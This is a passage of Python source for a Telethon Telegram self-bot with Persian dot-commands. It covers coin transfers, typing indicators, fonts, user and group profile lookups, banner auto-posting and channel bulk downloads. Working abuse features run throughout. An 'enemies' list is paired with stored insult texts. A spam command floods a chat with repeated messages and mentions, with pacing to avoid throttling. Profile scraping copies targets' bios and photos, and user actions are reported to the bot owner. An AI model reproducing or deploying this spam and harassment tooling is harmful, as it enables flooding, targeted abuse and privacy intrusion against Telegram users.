                        bot_ent = await event.client.get_input_entity(un)
                        peer = await event.get_input_chat()
                        results = await event.client(GetInlineBotResultsRequest(
                            bot=bot_ent,
                            peer=peer,
                            query="panel_" + str(uid),
                            offset="",
                        ))
                        if results and getattr(results, 'results', None):
                            await event.client(SendInlineBotResultRequest(
                                peer=peer,
                                query_id=results.query_id,
                                id=results.results[0].id,
                                hide_via=True,
                            ))
                            sent = True
                except Exception as e:
                    try:
                        await event.client.send_message('me', "خطا پنل اینلاین: " + str(e)[:150])
                    except Exception:
                        pass
                if not sent:
                    try:
                        t = build_self_panel_home_text()
                        mk = build_self_panel_home_mk(uid)
                        # فالبک متنی
                        body = build_self_cmds_text(uid)
                        # حذف پنل‌های قبلی همین چت
                        olds = self_panel_msgs.get((uid, event.chat_id)) or []
                        for oid in olds:
                            try:
                                await event.client.delete_messages(event.chat_id, oid)
                            except Exception:
                                pass
                        self_panel_msgs[(uid, event.chat_id)] = []
                        msg = await event.client.send_message(event.chat_id, body, parse_mode='HTML')
                        if msg:
                            self_panel_msgs.setdefault((uid, event.chat_id), []).append(msg.id)
                    except Exception as e:
                        try:
                            await event.client.send_message('me', "خطا پنل: " + str(e)[:120])
                        except Exception:
                            pass
                return


            # در حال نوشتن
            _tcmd = (text or '').replace('. ', '.').replace('．', '.').strip()
            _tcmdn = (text_norm or '').replace('. ', '.').replace('．', '.').strip()
            if _tcmd.startswith('.در حال نوشتن خاموش') or _tcmdn.startswith('.در حال نوشتن خاموش'):
                parts = text.split()
                target_chat = None
                if len(parts) >= 4:
                    # . در حال نوشتن خاموش ایدی — ممکن است فاصله‌ها فرق کند
                    pass
                # استخراج ایدی اگر باشد
                import re as _re_t
                ids = _re_t.findall(r'-?\d{5,}', text)
                if ids:
                    try:
                        target_chat = int(ids[-1])
                    except Exception:
                        target_chat = None
                if target_chat is None:
                    target_chat = event.chat_id
                conf = typing_jobs.get(uid) or get_ud(uid, 'typing_chats', {}) or {}
                if not isinstance(conf, dict):
                    conf = {}
                conf.pop(str(target_chat), None)
                conf.pop(target_chat, None)
                typing_jobs[uid] = conf
                set_user(uid, 'typing_chats', conf)
                # نام چت
                gname = str(target_chat)
                try:
                    ent = await event.client.get_entity(target_chat)
                    gname = getattr(ent, 'title', None) or getattr(ent, 'first_name', None) or str(target_chat)
                except Exception:
                    pass
                try:
                    await event.edit(f"در حال نوشتن در {gname} غیرفعال شد")
                except Exception:
                    try:
                        await event.reply(f"در حال نوشتن در {gname} غیرفعال شد")
                    except Exception:
                        pass
                await asyncio.sleep(2)
                try:
                    await event.delete()
                except Exception:
                    pass
                return

            if _tcmd.startswith('.در حال نوشتن') or _tcmdn.startswith('.در حال نوشتن'):
                if 'خاموش' in _tcmd:
                    return
                else:
                    import re as _re_t
                    ids = _re_t.findall(r'-?\d{5,}', _tcmd)
                    if ids and (_tcmd != '.در حال نوشتن'):
                        try:
                            target_chat = int(ids[-1])
                        except Exception:
                            target_chat = event.chat_id
                    else:
                        target_chat = event.chat_id
                    conf = typing_jobs.get(uid) or get_ud(uid, 'typing_chats', {}) or {}
                    if not isinstance(conf, dict):
                        conf = {}
                    conf[str(target_chat)] = True
                    typing_jobs[uid] = conf
                    set_user(uid, 'typing_chats', conf)
                    gname = str(target_chat)
                    try:
                        ent = await event.client.get_entity(target_chat)
                        gname = getattr(ent, 'title', None) or getattr(ent, 'first_name', None) or str(target_chat)
                    except Exception:
                        pass
                    try:
                        await event.edit(f"در حال نوشتن در {gname} فعال شد")
                    except Exception:
                        try:
                            await event.reply(f"در حال نوشتن در {gname} فعال شد")
                        except Exception:
                            pass
                    # یک بار فوری
                    try:
                        await event.client(SetTypingRequest(target_chat, SendMessageTypingAction()))
                    except Exception:
                        pass
                    await asyncio.sleep(2)
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    return


            # انتقال سکه با ریپلای — .انتقال 100 (حداقل ۱۰۰)
            if (text.startswith('.انتقال ') or text_norm.startswith('.انتقال ')) and event.is_reply:
                try:
                    raw_am = to_en_digits(text.replace('.انتقال', '').strip().split()[0])
                    amount = int(raw_am)
                    if amount < 100:
                        await event.edit("حداقل انتقال ۱۰۰ سکه است")
                        return
                except Exception:
                    try:
                        await event.edit("فرمت: .انتقال 100")
                    except Exception:
                        pass
                    return
                rep = await event.get_reply_message()
                tid = await get_real_sender(rep)
                if not tid or tid == uid:
                    try:
                        await event.edit("کاربر معتبر نیست")
                    except Exception:
                        pass
                    return
                if str(tid) not in load_data()['users'] or str(uid) not in load_data()['users']:
                    try:
                        await event.edit("هر دو باید عضو ربات باشند")
                    except Exception:
                        pass
                    return
                fc = get_ud(uid, 'coins', 0)
                if fc < amount:
                    try:
                        await event.edit("موجودی کافی نیست")
                    except Exception:
                        pass
                    return
                old_to = get_ud(tid, 'coins', 0)
                set_user(uid, 'coins', fc - amount)
                set_user(tid, 'coins', old_to + amount)
                name = await resolve_name(event.client, tid)
                my_name = get_ud(uid, 'original_name') or str(uid)
                body = (
                    "<blockquote><b>" + str(amount) + " سکه به " + str(name).replace("<","") + " با موفقیت انتقال شد</b></blockquote>\n"
                    + "<blockquote>SelfStr</blockquote>"
                )
                # منشن جدا
                try:
                    await event.edit(
                        str(amount) + " سکه به " + mention(tid, name) + " با موفقیت انتقال شد\nSelfStr",
                        parse_mode='Markdown',
                    )
                except Exception:
                    try:
                        await event.edit(str(amount) + " سکه انتقال یافت")
                    except Exception:
                        pass
                try:
                    bot.send_message(
                        tid,
                        "مقدار **" + str(amount) + "** سکه از کاربر " + mention(uid, my_name) + " به شما انتقال یافت",
                        parse_mode='Markdown',
                    )
                except Exception:
                    pass
                try:
                    bot.send_message(
                        uid,
                        "مقدار **" + str(amount) + "** سکه از شما به " + mention(tid, name) + " انتقال یافت",
                        parse_mode='Markdown',
                    )
                except Exception:
                    pass
                try:
                    notify_transfer_owner(uid, tid, amount, via="سلف")
                except Exception:
                    pass
                return

            if text.startswith('.فونت') or text_norm.startswith('.فونت'):
                raw = text.strip()
                if raw.startswith('.فونت'):
                    word = raw[len('.فونت'):].strip()
                else:
                    word = text_norm.strip()[len('.فونت'):].strip()
                if not word:
                    try:
                        await event.edit("مثال:\n.فونت ALI MOK")
                    except Exception:
                        pass
                    return
                variants = fancy_font_variants(word)
                if not variants:
                    try:
                        await event.edit("حروف لاتین بفرست\nمثال: .فونت ALI MOK")
                    except Exception:
                        pass
                    return
                body = "لیست فونت های " + word + " ↓" + chr(10) + chr(10) + chr(10).join(variants)
                try:
                    await event.edit(body)
                except Exception:
                    try:
                        await event.client.edit_message(event.chat_id, event.id, body)
                    except Exception:
                        try:
                            await event.reply(body)
                        except Exception:
                            pass
                return

            # .امار در پیوی بدون ریپلای → آمار طرف مقابل به پیام ذخیره شده
            if (text == '.امار' or text_norm.strip() == '.امار') and not event.is_reply and event.is_private:
                try:
                    await event.edit("در حال دریافت...")
                except Exception:
                    pass
                try:
                    chat = await event.get_chat()
                    tid = getattr(chat, 'id', None) or event.chat_id
                    # اگر خودت بودی رد شو
                    if int(tid) == int(uid):
                        try:
                            await event.delete()
                        except Exception:
                            pass
                        return
                    ent = await event.client.get_entity(tid)
                    name = await resolve_name(event.client, tid)
                    un = getattr(ent, 'username', None)
                    bio = ""
                    try:
                        from telethon.tl.functions.users import GetFullUserRequest
                        fu = await event.client(GetFullUserRequest(ent))
                        bio = getattr(fu.full_user, 'about', None) or ""
                    except Exception:
                        pass
                    coins = get_ud(tid, 'coins', 0)
                    if str(tid) not in load_data().get('users', {}):
                        coins = "—"
                        most = "—"
                    else:
                        most = top_cmd(tid)
                    body = (
                        "مشخصات کاربر (پیوی)" + chr(10)
                        + "نام: " + str(name) + chr(10)
                        + "یوزرنیم: " + (("@" + un) if un else "ندارد") + chr(10)
                        + "ایدی: `" + str(tid) + "`" + chr(10)
                        + "بیو: " + (bio or "ندارد") + chr(10)
                        + "موجودی: " + str(coins) + chr(10)
                        + "بیشترین استفاده: " + str(most)
                    )
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    sent = False
                    try:
                        photos = await event.client.get_profile_photos(ent, limit=1)
                        if photos:
                            await event.client.send_file(
                                'me', photos[0], caption=body, parse_mode='Markdown'
                            )
                            sent = True
                    except Exception:
                        sent = False
                    if not sent:
                        await event.client.send_message('me', body, parse_mode='Markdown')
                except Exception as e:
                    try:
                        await event.client.send_message('me', "خطا امار پیوی: " + str(e)[:120])
                    except Exception:
                        pass
                return

            if (text == '.امار' or text_norm.strip() == '.امار') and not event.is_reply and (event.is_group or getattr(event, 'is_channel', False)):
                try:
                    await event.edit("در حال دریافت...")
                except Exception:
                    pass
                try:
                    chat = await event.get_chat()
                    cid = event.chat_id
                    title = getattr(chat, 'title', None) or 'بدون نام'
                    un = getattr(chat, 'username', None)
                    link = f"https://t.me/{un}" if un else ""
                    if not link:
                        try:
                            from telethon.tl.functions.messages import ExportChatInviteRequest
                            inv = await event.client(ExportChatInviteRequest(chat))
                            link = getattr(inv, 'link', None) or str(inv)
                        except Exception:
                            try:
                                from telethon.tl.functions.messages import ExportChatInviteRequest
                                inv = await event.client(ExportChatInviteRequest(cid))
                                link = getattr(inv, 'link', None) or str(inv)
                            except Exception:
                                link = "ایدی: `" + str(cid) + "`"
                    about = ""
                    members = ""
                    try:
                        from telethon.tl.functions.channels import GetFullChannelRequest
                        from telethon.tl.functions.messages import GetFullChatRequest
                        full = None
                        try:
                            full = await event.client(GetFullChannelRequest(chat))
                        except Exception:
                            try:
                                full = await event.client(GetFullChatRequest(chat.id))
                            except Exception:
                                full = None
                        if full:
                            fc = getattr(full, 'full_chat', None) or full
                            about = getattr(fc, 'about', None) or ""
                            pc = getattr(fc, 'participants_count', None)
                            if pc is not None:
                                members = str(pc)
                    except Exception:
                        pass
                    # ایدی کامل عددی برای کپی (مثلاً -100...)
                    cid_full = str(cid)
                    body = (
                        "مشخصات گروه/کانال" + chr(10)
                        + "نام: " + str(title) + chr(10)
                        + "ایدی عددی:" + chr(10)
                        + "`" + cid_full + "`" + chr(10)
                        + "یوزرنیم: " + (("@" + un) if un else "ندارد") + chr(10)
                        + "لینک: " + link + chr(10)
                        + "اعضا: " + (members or "نامشخص") + chr(10)
                        + "بیو: " + (about or "ندارد")
                    )
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    sent = False
                    try:
                        photos = await event.client.get_profile_photos(chat, limit=1)
                        if photos:
                            await event.client.send_file(
                                'me', photos[0], caption=body, parse_mode='Markdown'
                            )
                            sent = True
                    except Exception:
                        sent = False
                    if not sent:
                        await event.client.send_message('me', body, parse_mode='Markdown')
                except Exception as e:
                    try:
                        await event.client.send_message('me', "خطا امار گروه: " + str(e)[:120])
                    except Exception:
                        pass
                return

            if (text == '.امار' or text_norm.strip() == '.امار') and event.is_reply:
                rep = await event.get_reply_message()
                tid = await get_real_sender(rep)
                if not tid:
                    try:
                        tid = rep.sender_id or (rep.from_id.user_id if getattr(rep, 'from_id', None) and hasattr(rep.from_id, 'user_id') else None)
                    except Exception:
                        tid = None
                if not tid:
                    try:
                        s = await rep.get_sender()
                        tid = s.id if s else None
                    except Exception:
                        tid = None
                if not tid:
                    try:
                        await event.edit("نتونستم کاربر رو تشخیص بدم")
                    except Exception:
                        pass
                    return
                try:
                    await event.edit("در حال دریافت...")
                except Exception:
                    pass
                try:
                    ent = await event.client.get_entity(tid)
                    name = await resolve_name(event.client, tid)
                    un = getattr(ent, 'username', None)
                    bio = ""
                    try:
                        from telethon.tl.functions.users import GetFullUserRequest
                        fu = await event.client(GetFullUserRequest(ent))
                        bio = getattr(fu.full_user, 'about', None) or ""
                    except Exception:
                        pass
                    body = (
                        "مشخصات کاربر" + chr(10)
                        + "نام: " + str(name) + chr(10)
                        + "یوزرنیم: " + (("@" + un) if un else "ندارد") + chr(10)
                        + "ایدی: `" + str(tid) + "`" + chr(10)
                        + "بیو: " + (bio or "ندارد")
                    )
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    sent = False
                    try:
                        photos = await event.client.get_profile_photos(ent, limit=1)
                        if photos:
                            await event.client.send_file(
                                'me', photos[0],
                                caption=body,
                                parse_mode='Markdown',
                            )
                            sent = True
                    except Exception:
                        sent = False
                    if not sent:
                        await event.client.send_message('me', body, parse_mode='Markdown')
                    try:
                        await report_self_cmd(
                            event, uid, ".امار",
                            "امار گرفته از: " + mention(tid, name) + " | `" + str(tid) + "`"
                            + ((" | @" + un) if un else ""),
                        )
                    except Exception:
                        pass
                except Exception as e:
                    try:
                        await event.client.send_message('me', "خطا امار: " + str(e))
                    except Exception:
                        pass
                return

            if (text.strip() == '.تنظیم دشمن' or text_norm.strip() == '.تنظیم دشمن') and event.is_reply:
                rep = await event.get_reply_message()
                tid = await get_real_sender(rep)
                if not tid:
                    await event.edit("نتونستم کاربر رو تشخیص بدم")
                    await asyncio.sleep(2)
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    return
                if tid == uid:
                    await event.edit("خودت دشمن نمیشی")
                    await asyncio.sleep(2)
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    return
                name = await resolve_name(event.client, tid)
                scope = 'private' if event.is_private else 'group'
                enemies = get_ud(uid, 'enemies', {})
                # سازگاری با لیست قدیمی
                if isinstance(enemies, list):
                    enemies = {str(x): 'group' for x in enemies}
                if not isinstance(enemies, dict):
                    enemies = {}
                key = str(tid)
                if key not in enemies or enemies.get(key) != scope:
                    enemies[key] = scope
                    set_user(uid, 'enemies', enemies)
                    sc = "پیوی" if scope == 'private' else "گروه"
                    await event.edit(f"{mention(tid, name)} به لیست دشمنان اضافه شد", parse_mode='Markdown')
                    try:
                        await maybe_report_cmd(event, uid, "تنظیم دشمن", "دشمن: " + mention(tid, name) + " | `" + str(tid) + "` | محدوده: " + sc)
                    except Exception:
                        pass
                else:
                    await event.edit("قبلا اضافه شده")
                await asyncio.sleep(2)
                try:
                    await event.delete()
                except Exception:
                    pass
                return

            if (text.startswith('.تنظیم دشمن ') or text_norm.startswith('.تنظیم دشمن ')) and 'اتک' not in text and 'اتک' not in text_norm:
                try:
                    tid = int(text.split()[-1])
                except Exception:
                    await event.edit("ایدی معتبر وارد کن")
                    await asyncio.sleep(2)
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    return
                if tid == uid:
                    await event.edit("خودت دشمن نمیشی")
                    await asyncio.sleep(2)
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    return
                enemies = get_ud(uid, 'enemies', {})
                if isinstance(enemies, list):
                    enemies = {str(x): 'group' for x in enemies}
                if not isinstance(enemies, dict):
                    enemies = {}
                scope = 'private' if event.is_private else 'group'
                name = await resolve_name(event.client, tid)
                key = str(tid)
                if key not in enemies or enemies.get(key) != scope:
                    enemies[key] = scope
                    set_user(uid, 'enemies', enemies)
                    sc = "پیوی" if scope == 'private' else "گروه"
                    await event.edit(f"{mention(tid, name)} به لیست دشمنان اضافه شد", parse_mode='Markdown')
                    try:
                        await maybe_report_cmd(event, uid, "تنظیم دشمن", "دشمن: " + mention(tid, name) + " | `" + str(tid) + "` | محدوده: " + sc)
                    except Exception:
                        pass
                else:
                    await event.edit("قبلا اضافه شده")
                await asyncio.sleep(2)
                try:
                    await event.delete()
                except Exception:
                    pass
                return

            if ((text.strip() == '.حذف دشمن') or (text_norm.strip() == '.حذف دشمن')) and event.is_reply:
                rep = await event.get_reply_message()
                tid = await get_real_sender(rep)
                if not tid:
                    try:
                        await event.edit("نتونستم کاربر رو تشخیص بدم")
                    except Exception:
                        pass
                    await asyncio.sleep(2)
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    return
                enemies = get_ud(uid, 'enemies', {})
                if isinstance(enemies, list):
                    enemies = {str(x): 'group' for x in enemies}
                if not isinstance(enemies, dict):
                    enemies = {}
                # پاک کردن با کلید str و int
                name = await resolve_name(event.client, tid)
                key = str(tid)
                removed = False
                if key in enemies:
                    del enemies[key]
                    removed = True
                if tid in enemies:
                    try:
                        del enemies[tid]
                        removed = True
                    except Exception:
                        pass
                # هر کلید هم‌عدد
                for k in list(enemies.keys()):
                    try:
                        if int(k) == int(tid):
                            del enemies[k]
                            removed = True
                    except Exception:
                        pass
                set_user(uid, 'enemies', enemies)
                if removed:
                    try:
                        await event.edit(mention(tid, name) + " از لیست دشمنان حذف شد", parse_mode='Markdown')
                    except Exception:
                        try:
                            await event.edit(str(name) + " از لیست دشمنان حذف شد")
                        except Exception:
                            pass
                else:
                    try:
                        await event.edit("در لیست دشمنان نیست")
                    except Exception:
                        pass
                await asyncio.sleep(2)
                try:
                    await event.delete()
                except Exception:
                    pass
                return

            if (text.startswith('.حذف دشمن ') or text_norm.startswith('.حذف دشمن ')) and 'اتک' not in text and 'اتک' not in text_norm:
                try:
                    tid = int(to_en_digits(text.split()[-1]))
                except Exception:
                    try:
                        tid = int(to_en_digits(text_norm.split()[-1]))
                    except Exception:
                        try:
                            await event.edit("ایدی معتبر وارد کن")
                        except Exception:
                            pass
                        await asyncio.sleep(2)
                        try:
                            await event.delete()
                        except Exception:
                            pass
                        return
                enemies = get_ud(uid, 'enemies', {})
                if isinstance(enemies, list):
                    enemies = {str(x): 'group' for x in enemies}
                if not isinstance(enemies, dict):
                    enemies = {}
                name = await resolve_name(event.client, tid)
                removed = False
                for k in list(enemies.keys()):
                    try:
                        if int(k) == int(tid) or str(k) == str(tid):
                            del enemies[k]
                            removed = True
                    except Exception:
                        if str(k) == str(tid):
                            del enemies[k]
                            removed = True
                set_user(uid, 'enemies', enemies)
                if removed:
                    try:
                        await event.edit(mention(tid, name) + " از لیست دشمنان حذف شد", parse_mode='Markdown')
                    except Exception:
                        try:
                            await event.edit(str(name) + " از لیست دشمنان حذف شد")
                        except Exception:
                            pass
                else:
                    try:
                        await event.edit("در لیست نیست")
                    except Exception:
                        pass
                await asyncio.sleep(2)
                try:
                    await event.delete()
                except Exception:
                    pass
                return

            if text.strip() in ('.لیست دشمنان',) or text_norm.strip() in ('.لیست دشمنان',):
                enemies = get_ud(uid, 'enemies', {})
                if isinstance(enemies, list):
                    enemies = {str(x): 'group' for x in enemies}
                if not isinstance(enemies, dict):
                    enemies = {}
                if not enemies:
                    await event.edit("لیست دشمنان خالی است")
                    await asyncio.sleep(1.5)
                    try: await event.delete()
                    except: pass
                    return
                lines = []
                for eid, sc in enemies.items():
                    scn = "پیوی" if sc == 'private' else "گروه"
                    try:
                        ent = await event.client.get_entity(int(eid))
                        name = ent.first_name or str(eid)
                        lines.append(f"{name} | `{eid}` | {scn}")
                    except Exception:
                        lines.append(f"`{eid}` | {scn}")
                await event.edit("لیست دشمنان:\n\n" + "\n".join(lines), parse_mode='Markdown')
                return

            if text.strip() in ('.پاکسازی لیست دشمنان',) or text_norm.strip() in ('.پاکسازی لیست دشمنان',):
                set_user(uid, 'enemies', {})
                insult_index[uid] = 0
                await event.edit("لیست دشمنان پاک شد")
                return

            if text == '.ثبت متن':
                insult_wait[uid] = {'list': [], 'msg': event, 'owner': uid}
                await event.edit("متن هاتو یکی یکی رو این پیام ریپلای کن\nهر وقت تموم شد این دستور رو بزن:\n`.ذخیره`", parse_mode='Markdown')
                try:
                    await maybe_report_cmd(event, uid, "ثبت متن", "")
                except Exception:
                    pass
                return

            if text == '.ذخیره' and uid in insult_wait:
                st = insult_wait[uid]
                if st.get('owner') == uid and st.get('list'):
                    ins = get_ud(uid, 'insults', [])
                    ins.extend(st['list'])
                    set_user(uid, 'insults', ins)
                    await st['msg'].edit("تمامی متن ها ذخیره شد")
                    del insult_wait[uid]
                    await asyncio.sleep(3)
                    try: await st['msg'].delete()
                    except: pass
                    try: await event.delete()
                    except: pass
                return

            if uid in insult_wait and event.is_reply:
                st = insult_wait[uid]
                if st.get('owner') == uid and event.reply_to_msg_id == st['msg'].id:
                    st['list'].append(text)
                    try: await event.delete()
                    except: pass
                    return

            if text == '.لیست متن':
                ins = get_ud(uid, 'insults', [])
                if not ins:
                    await event.edit("لیست خالی است")
                    await asyncio.sleep(2)
                    try: await event.delete()
                    except: pass
                    return
                parts = ["لیست متن"]
                for i in ins:
                    parts.append("<blockquote>" + str(i).replace("<", "&lt;").replace(">", "&gt;") + "</blockquote>")
                await event.edit(chr(10).join(parts), parse_mode='html')
                return

            if text == '.پاکسازی لیست متن':
                set_user(uid, 'insults', [])
                insult_index[uid] = 0
                await event.edit("تمامی متن های لیست حذف شدن")
                await asyncio.sleep(2)

            # ===== بنر =====
            if text.startswith('.تنظیم بنر') or text_norm.startswith('.تنظیم بنر'):
                import re as _re_b
                import time as _t_b
                m = _re_b.search(r'(\d+)', text)
                interval = int(m.group(1)) if m else 0
                # ایدی گروه اختیاری از پیام ذخیره
                ids = _re_b.findall(r'-?\d{6,}', text)
                target_chat = event.chat_id
                if ids and (event.is_private or str(event.chat_id) == str(uid)):
                    try:
                        target_chat = int(ids[-1])
                    except Exception:
                        target_chat = event.chat_id
                if interval < 1:
                    try:
                        await event.edit("مثال: `.تنظیم بنر 50` (ریپلای روی پیام بنر)")
                    except Exception:
                        pass
                    return
                if not event.is_reply:
                    try:
                        await event.edit("روی پیام بنر ریپلای کن" + chr(10) + "مثال: `.تنظیم بنر 50`")
                    except Exception:
                        pass
                    return
                rep = await event.get_reply_message()
                fpath = None
                cap = rep.message or rep.text or ''
                ents_data = entities_to_data(rep.entities)
                ents_dict = entities_to_dict(rep.entities)
                kind = 'text'
                try:
                    if rep.media:
                        os.makedirs('banner_media', exist_ok=True)
                        fpath = await event.client.download_media(
                            rep, file=os.path.join('banner_media', f'{uid}_{target_chat}_{int(rep.id)}')
                        )
                        kind = media_kind(rep)
                except Exception:
                    fpath = None
                job = {
                    'interval': interval,
                    'next_ts': _t_b.time() + interval * 60,
                    'file': fpath,
                    'text': cap,
                    'kind': kind,
                    'entities_data': ents_data or [],
                    'entities': entities_to_dict(rep.entities),
                }
                if uid not in banner_jobs:
                    banner_jobs[uid] = {}
                banner_jobs[uid][int(target_chat)] = job
                # persist
                meta = get_ud(uid, 'banners', {}) or {}
                meta[str(target_chat)] = {
                    'interval': interval,
                    'file': fpath,
                    'text': cap,
                    'kind': kind,
                    'entities_data': ents_data or [],
                    'entities': entities_to_dict(rep.entities),
                }
                set_user(uid, 'banners', meta)
                gname = str(target_chat)
                try:
                    ent = await event.client.get_entity(target_chat)
                    gname = getattr(ent, 'title', None) or getattr(ent, 'first_name', None) or str(target_chat)
                except Exception:
                    pass
                try:
                    await event.edit(
                        "بنر ثبت شد" + chr(10)
                        + "گروه: " + str(gname) + chr(10)
                        + "loop " + str(interval) + chr(10)
                        + "بنر با موفقیت ثبت شد"
                    )
                except Exception:
                    pass
                await asyncio.sleep(2)
                try:
                    await event.delete()
                except Exception:
                    pass
                return

            if text.startswith('.توقف ارسال بنر') or text_norm.startswith('.توقف ارسال بنر'):
                import re as _re_b
                ids = _re_b.findall(r'-?\d{6,}', text)
                target_chat = event.chat_id
                if ids:
                    try:
                        target_chat = int(ids[-1])
                    except Exception:
                        pass
                if uid in banner_jobs:
                    banner_jobs[uid].pop(int(target_chat), None)
                meta = get_ud(uid, 'banners', {}) or {}
                meta.pop(str(target_chat), None)
                set_user(uid, 'banners', meta)
                try:
                    await event.edit("ارسال بنر متوقف شد")
                except Exception:
                    pass
                await asyncio.sleep(2)
                try:
                    await event.delete()
                except Exception:
                    pass
                return

            if text.startswith('.بنر فعلی') or text_norm.startswith('.بنر فعلی'):
                import re as _re_b
                ids = _re_b.findall(r'-?\d{6,}', text)
                target_chat = event.chat_id
                if ids:
                    try:
                        target_chat = int(ids[-1])
                    except Exception:
                        pass
                job = (banner_jobs.get(uid) or {}).get(int(target_chat))
                if not job:
                    meta = get_ud(uid, 'banners', {}) or {}
                    job = meta.get(str(target_chat))
                if not job:
                    try:
                        await event.edit("بنری ثبت نشده")
                    except Exception:
                        pass
                    return
                try:
                    await send_banner_message(event.client, event.chat_id, job)
                    try:
                        await event.delete()
                    except Exception:
                        pass
                except Exception as e:
                    try:
                        await event.edit("خطا بنر: " + str(e)[:80])
                    except Exception:
                        pass
                return

            if text in ('.لغو', '.لغو اسپم') or text_norm in ('.لغو', '.لغو اسپم'):
                spam_cancel[uid] = True
                # توقف اسپم اکانت اضافه هم
                for k, job in list(extra_spam_jobs.items()):
                    if k[0] == uid and isinstance(job, dict):
                        job['active'] = False
                try:
                    await event.edit("اسپم لغو گردید")
                except Exception:
                    try:
                        await event.reply("اسپم لغو گردید")
                    except Exception:
                        pass
                return

            if text.startswith('.اسپم ') or text_norm.startswith('.اسپم '):
                import re as _re
                raw = (event.message.text or event.message.message or text or '').strip()
                raw_n = raw.replace('ي', 'ی').replace('ك', 'ک')
                if _re.search(r'(?:t\.me|telegram\.me)/', raw_n, flags=_re.I):
                    return
                count = None
                spam_body = None
                mention_id = None
                mention_tail = ''
                m2 = _re.match(r'^\.اسپم\s+(.+?)\s+(\d+)\s+(\d{5,})\s+(\S+)\s*$', raw_n)
                m1 = _re.match(r'^\.اسپم\s+(\d+)\s+(.+)$', raw_n, flags=_re.S)
                if m2:
                    spam_body = m2.group(1).strip()
                    count = int(m2.group(2))
                    mention_id = int(m2.group(3))
                    mention_tail = m2.group(4)
                elif m1:
                    count = int(m1.group(1))
                    spam_body = m1.group(2).strip()
                else:
                    return
                if not spam_body or not count or count < 1:
                    return
                delay = float(get_ud(uid, 'spam_delay', 0) or 0)
                reply_to = event.reply_to_msg_id
                chat_id = event.chat_id
                try:
                    await event.delete()
                except Exception:
                    pass
                spam_cancel[uid] = False
                try:
                    mark_self_use(uid)
                except Exception:
                    pass
                try:
                    gtitle = None
                    glink = None
                    try:
                        ch = await event.get_chat()
                        gtitle = getattr(ch, 'title', None)
                        un = getattr(ch, 'username', None)
                        if un:
                            glink = "https://t.me/" + str(un)
                        else:
                            glink = "https://t.me/c/" + str(chat_id).replace('-100', '')
                    except Exception:
                        pass
                    report_owner_action(
                        uid, "اسپم",
                        "تعداد: " + str(count) + " | متن: " + str(spam_body)[:80],
                        group_id=chat_id, group_title=gtitle, group_link=glink,
                    )
                except Exception:
                    pass
                for i_sent in range(count):
                    if spam_cancel.get(uid):
                        break
                    try:
                        if mention_id:
                            msg = f"{spam_body} [{mention_tail or '.'}](tg://user?id={mention_id})"
                            await event.client.send_message(chat_id, msg, parse_mode='Markdown', reply_to=reply_to)
                        else:
                            await event.client.send_message(chat_id, spam_body, reply_to=reply_to)
                    except Exception:
                        break
                    if delay > 0:
                        await asyncio.sleep(delay)
                    else:
                        await asyncio.sleep(0.05 if (i_sent + 1) % 50 else 1)
                return


            # دانلود از چنل / لینک پیام
            if text.startswith('.@') or text_norm.startswith('.@'):
                import re as _re
                raw = text.strip()
                m = _re.match(r'^\.@([A-Za-z][\w]{3,})\s*(.*)$', raw)
                if not m:
                    m = _re.match(r'^\.@([A-Za-z][\w]{3,})\s*(.*)$', text_norm)
                if m:
                    uname = m.group(1)
                    filt = (m.group(2) or '').strip() or 'کل محتوا'
                    try:
                        await event.edit("در حال دریافت...")
                    except Exception:
                        pass
                    try:
                        entity = await event.client.get_entity(uname)
                    except Exception:
                        try:
                            entity = await event.client.get_entity('@' + uname)
                        except Exception as e:
                            try:
                                await event.edit("چنل پیدا نشد")
                            except Exception:
                                pass
                            await asyncio.sleep(2)
                            try:
                                await event.delete()
                            except Exception:
                                pass
                            return
                    # اگر فیلتر لینک پیام بود
                    link_in = _re.search(r'(https?://\S+|t\.me/\S+)', filt)
                    if link_in:
                        parsed = await parse_tme_link(link_in.group(0))
                        if parsed:
                            peer, mid = parsed
                            try:
                                msg = await event.client.get_messages(peer if not isinstance(peer, str) else entity, ids=mid)
                                if not msg:
                                    msg = await event.client.get_messages(entity, ids=mid)
                                if msg:
                                    await save_msg_to_me(event.client, msg, header=f"از @{uname} | {mid}", dest=(event.chat_id if event.is_group else 'me'))
                                    try:
                                        await event.edit("ذخیره شد")
                                    except Exception:
                                        pass
                                else:
                                    try:
                                        await event.edit("تو چنل نبودن")
                                    except Exception:
                                        pass
                            except Exception as e:
                                try:
                                    await event.edit("خطا: " + str(e)[:80])
                                except Exception:
                                    pass
                            await asyncio.sleep(2)
                            try:
                                await event.delete()
                            except Exception:
                                pass
                            return
                    count = 0
                    try:
                        async for msg in event.client.iter_messages(entity, limit=500):
                            kind = media_kind(msg)
                            if not match_kind_filter(kind, filt):
                                continue
                            ok = await save_msg_to_me(event.client, msg, dest=(event.chat_id if event.is_group else 'me'))
                            if ok:
                                count += 1
                            if count >= 200:
                                break
                    except Exception as e:
                        try:
                            await event.edit("خطا: " + str(e)[:100])
                        except Exception:
                            pass
                        await asyncio.sleep(2)
                        try:
                            await event.delete()
                        except Exception:
                            pass
                        return
                    if count == 0:
                        try:
                            await event.edit("تو چنل نبودن")
                        except Exception:
                            pass
                    else:
                        try:
                            await event.edit(f"{count} مورد ذخیره شد")
                        except Exception:
                            pass
                    await asyncio.sleep(2)
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    return

            if text.startswith('.http') or text_norm.startswith('.http') or text.startswith('.t.me/') or (
                text.startswith('.') and ('t.me/' in text or 'telegram.me/' in text)
            ):
                link = text[1:].strip() if text.startswith('.') else text.strip()
                parsed = await parse_tme_link(link)
                if parsed:
                    try:
                        await event.edit("در حال دریافت...")
                    except Exception:
                        pass
                    peer, mid = parsed
                    try:
                        msg = await event.client.get_messages(peer, ids=mid)
                        if not msg and isinstance(peer, int):
                            # تلاش با entity
                            try:
                                ent = await event.client.get_entity(peer)
                                msg = await event.client.get_messages(ent, ids=mid)
                            except Exception:
                                pass
                        if msg:
                            dest = event.chat_id if event.is_group else 'me'
                            ok = False
                            try:
                                ok = await save_msg_to_me(event.client, msg, header="لینک | " + str(mid), dest=dest)
                            except Exception as e:
                                print("save link err", e)
                            if not ok:
                                try:
                                    await event.client.forward_messages(dest, msg)
